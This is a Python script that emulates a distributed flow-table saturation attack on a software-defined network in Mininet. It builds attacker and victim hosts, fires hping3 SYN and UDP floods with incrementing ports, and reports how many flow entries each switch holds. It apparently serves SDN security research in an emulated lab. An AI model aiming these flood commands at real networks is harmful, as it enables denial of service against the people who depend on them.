#!/usr/bin/python3
"""
Multi-Host Flow Table Saturation Attack
Simulates distributed attack from multiple hosts
WARNING: Use only in controlled test environments
"""

from mininet.net import Mininet
from mininet.node import RemoteController, OVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel
import time
import threading

RYU_CONTROLLER_IP = "127.0.0.1"

class SaturationTopology:
    def __init__(self, num_attackers=20, num_victims=3):
        self.num_attackers = num_attackers
        self.num_victims = num_victims
        self.net = None
        
    def create_topology(self):
        """Create topology with multiple attacker hosts"""
        print(f"[*] Creating topology with {self.num_attackers} attacker hosts")
        
        # Create Mininet without default controller
        net = Mininet(controller=None, switch=OVSSwitch)
        
        # Add Ryu remote controller
        c0 = net.addController(
            name='c0',
            controller=RemoteController,
            ip=RYU_CONTROLLER_IP,
            port=6633
        )
        
        # Create switches
        s1 = net.addSwitch('s1', protocols='OpenFlow13')
        s2 = net.addSwitch('s2', protocols='OpenFlow13')
        s3 = net.addSwitch('s3', protocols='OpenFlow13')
        s4 = net.addSwitch('s4', protocols='OpenFlow13')
        
        # Create mesh topology between switches
        net.addLink(s1, s2)
        net.addLink(s1, s3)
        net.addLink(s2, s3)
        net.addLink(s2, s4)
        net.addLink(s3, s4)
        
        # Create attacker hosts (distributed across switches)
        attackers = []
        for i in range(self.num_attackers):
            ip = f'10.0.0.{i+1}/24'
            host = net.addHost(f'attacker{i+1}', ip=ip)
            
            # Distribute attackers across switches
            if i % 4 == 0:
                net.addLink(host, s1)
            elif i % 4 == 1:
                net.addLink(host, s2)
            elif i % 4 == 2:
                net.addLink(host, s3)
            else:
                net.addLink(host, s4)
            
            attackers.append(host)
        
        # Create victim hosts
        victims = []
        for i in range(self.num_victims):
            ip = f'10.0.1.{i+1}/24'
            host = net.addHost(f'victim{i+1}', ip=ip)
            
            # Connect victims to different switches
            if i == 0:
                net.addLink(host, s2)
            elif i == 1:
                net.addLink(host, s3)
            else:
                net.addLink(host, s4)
            
            victims.append(host)
        
        self.net = net
        self.attackers = attackers
        self.victims = victims
        
        return net
    
    def start_network(self):
        """Start the network"""
        print("[*] Starting network...")
        self.net.start()
        
        # Wait for switches to connect
        print("[*] Waiting for switches to connect to controller...")
        time.sleep(3)
        
        # Test connectivity
        print("[*] Testing connectivity...")
        self.net.pingAll()
        
        return True
    
    def launch_attack(self, attack_type='syn_flood', duration=30, rate=100):
        """
        Launch coordinated attack from multiple hosts
        
        attack_type: 'syn_flood', 'udp_flood', 'mixed'
        duration: attack duration in seconds
        rate: packets per second per attacker
        """
        print(f"\n[*] Launching {attack_type} attack")
        print(f"[*] Attackers: {len(self.attackers)}")
        print(f"[*] Duration: {duration}s")
        print(f"[*] Rate: {rate} pps per attacker")
        print(f"[*] Total: {len(self.attackers) * rate} pps")
        
        threads = []
        
        for i, attacker in enumerate(self.attackers):
            victim = self.victims[i % len(self.victims)]
            victim_ip = victim.IP()
            
            if attack_type == 'syn_flood':
                cmd = self._syn_flood_cmd(victim_ip, duration, rate)
            elif attack_type == 'udp_flood':
                cmd = self._udp_flood_cmd(victim_ip, duration, rate)
            elif attack_type == 'mixed':
                if i % 2 == 0:
                    cmd = self._syn_flood_cmd(victim_ip, duration, rate)
                else:
                    cmd = self._udp_flood_cmd(victim_ip, duration, rate)
            
            # Launch attack in background
            thread = threading.Thread(
                target=self._run_attack,
                args=(attacker, cmd)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            time.sleep(0.1)  # Stagger start times
        
        print(f"[+] Attack launched from {len(threads)} hosts")
        print(f"[*] Attack will run for {duration} seconds...")
        
        # Wait for attacks to complete
        for thread in threads:
            thread.join()
        
        print("[+] Attack completed")
    
    def _syn_flood_cmd(self, target_ip, duration, rate):
        """Generate SYN flood command with random ports"""
        interval = int(1000000 / rate)  # microseconds
        count = duration * rate
        return f'hping3 -S --destport ++1 --flood -i u{interval} -c {count} {target_ip} > /dev/null 2>&1'
    
    def _udp_flood_cmd(self, target_ip, duration, rate):
        """Generate UDP flood command"""
        interval = int(1000000 / rate)
        count = duration * rate
        return f'hping3 --udp --destport ++1 --flood -i u{interval} -c {count} {target_ip} > /dev/null 2>&1'
    
    def _run_attack(self, host, cmd):
        """Execute attack command on host"""
        host.cmd(cmd)
    
    def monitor_flows(self):
        """Monitor flow table occupancy"""
        switches = ['s1', 's2', 's3', 's4']
        
        print("\n" + "="*70)
        print("Flow Table Status")
        print("="*70)
        
        total_flows = 0
        for switch in switches:
            cmd = f'ovs-ofctl -O OpenFlow13 dump-flows {switch} | grep "cookie=" | wc -l'
            result = self.net.get(switch).cmd(cmd)
            count = int(result.strip()) if result.strip() else 0
            total_flows += count
            
            status = "NORMAL"
            if count > 5000:
                status = "HIGH"
            if count > 20000:
                status = "CRITICAL"
            
            print(f"{switch:8s}: {count:7d} flows [{status}]")
        
        print(f"{'TOTAL':8s}: {total_flows:7d} flows")
        print("="*70 + "\n")
        
        return total_flows
    
    def stop(self):
        """Stop the network"""
        if self.net:
            self.net.stop()


def attack_scenario_1():
    """
    Scenario 1: Gradual saturation attack
    Multiple hosts gradually increase attack rate
    """
    print("\n" + "="*70)
    print("SCENARIO 1: Gradual Saturation Attack")
    print("="*70)
    
    topo = SaturationTopology(num_attackers=15, num_victims=3)
    topo.create_topology()
    topo.start_network()
    
    print("\n[*] Initial state:")
    topo.monitor_flows()
    
    # Phase 1: Low rate
    print("\n[*] Phase 1: Low rate (50 pps per host)")
    topo.launch_attack(attack_type='syn_flood', duration=10, rate=50)
    topo.monitor_flows()
    
    time.sleep(2)
    
    # Phase 2: Medium rate
    print("\n[*] Phase 2: Medium rate (200 pps per host)")
    topo.launch_attack(attack_type='syn_flood', duration=15, rate=200)
    topo.monitor_flows()
    
    time.sleep(2)
    
    # Phase 3: High rate
    print("\n[*] Phase 3: High rate (500 pps per host)")
    topo.launch_attack(attack_type='mixed', duration=20, rate=500)
    topo.monitor_flows()
    
    print("\n[*] Opening CLI for analysis...")
    CLI(topo.net)
    
    topo.stop()


def attack_scenario_2():
    """
    Scenario 2: Sudden burst attack
    All hosts simultaneously flood the network
    """
    print("\n" + "="*70)
    print("SCENARIO 2: Sudden Burst Attack")
    print("="*70)
    
    topo = SaturationTopology(num_attackers=30, num_victims=3)
    topo.create_topology()
    topo.start_network()
    
    print("\n[*] Initial state:")
    topo.monitor_flows()
    
    print("\n[*] Launching coordinated burst attack...")
    topo.launch_attack(attack_type='mixed', duration=30, rate=1000)
    
    topo.monitor_flows()
    
    print("\n[*] Opening CLI for analysis...")
    CLI(topo.net)
    
    topo.stop()


def interactive_mode():
    """
    Interactive mode: Manual control
    """
    print("\n" + "="*70)
    print("INTERACTIVE MODE")
    print("="*70)
    
    num_attackers = int(input("Number of attacker hosts (10-50): "))
    num_victims = int(input("Number of victim hosts (1-5): "))
    
    topo = SaturationTopology(num_attackers=num_attackers, num_victims=num_victims)
    topo.create_topology()
    topo.start_network()
    
    print("\n[*] Initial state:")
    topo.monitor_flows()
    
    print("\nAvailable commands in CLI:")
    print("  - Monitor flows: sh ovs-ofctl -O OpenFlow13 dump-flows s1 | wc -l")
    print("  - Clear flows: sh ovs-ofctl -O OpenFlow13 del-flows s1")
    print("  - Manual attack: attacker1 hping3 -S --destport ++1 victim1 &")
    print("  - Check host IPs: dump")
    
    CLI(topo.net)
    
    topo.stop()


def main():
    print("="*70)
    print("Flow Table Saturation Attack Framework")
    print("="*70)
    print("\nScenarios:")
    print("1. Gradual Saturation (15 attackers, 3 phases)")
    print("2. Sudden Burst (30 attackers, high rate)")
    print("3. Interactive Mode (custom configuration)")
    print("4. Quick Test (5 attackers, 30s)")
    
    choice = input("\nSelect scenario (1-4): ")
    
    if choice == '1':
        attack_scenario_1()
    elif choice == '2':
        attack_scenario_2()
    elif choice == '3':
        interactive_mode()
    elif choice == '4':
        # Quick test
        topo = SaturationTopology(num_attackers=5, num_victims=2)
        topo.create_topology()
        topo.start_network()
        topo.monitor_flows()
        topo.launch_attack(attack_type='syn_flood', duration=30, rate=200)
        topo.monitor_flows()
        CLI(topo.net)
        topo.stop()
    else:
        print("[!] Invalid choice")


if __name__ == '__main__':
    setLogLevel('info')
    main()
